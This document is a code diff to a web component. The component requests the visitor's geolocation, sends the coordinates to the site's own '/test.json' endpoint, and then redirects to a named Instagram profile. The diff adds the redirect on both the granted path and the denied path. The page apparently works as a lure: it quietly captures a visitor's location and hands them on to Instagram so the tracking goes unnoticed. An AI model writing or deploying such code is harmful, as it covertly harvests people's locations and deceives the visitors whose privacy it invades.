@@ -13,7 +13,7 @@ export default function Component() {
 					console.log(result.state);
 					navigator.geolocation.getCurrentPosition((e) =>
 						fetch(`/test.json?lat=${e.coords.latitude}&long=${e.coords.longitude}`).then(
-							(response) => console.log(response)
+							(response) => window.location.replace('https://www.instagram.com/lovelynoe__/')
 						)
 					);
 					//If granted then you can directly call your function here
@@ -21,12 +21,13 @@ export default function Component() {
 					console.log(result.state);
 					navigator.geolocation.getCurrentPosition((e) =>
 						fetch(`/test.json?lat=${e.coords.latitude}&long=${e.coords.longitude}`).then(
-							(response) => console.log(response)
+							(response) => window.location.replace('https://www.instagram.com/lovelynoe__/')
 						)
 					);
 				} else if (result.state === 'denied') {
 					//If denied then you have to show instructions to enable location
 					console.log(result.state);
+					window.location.replace('https://www.instagram.com/lovelynoe__/');
 				}
 				result.onchange = function () {
 					console.log(result.state);
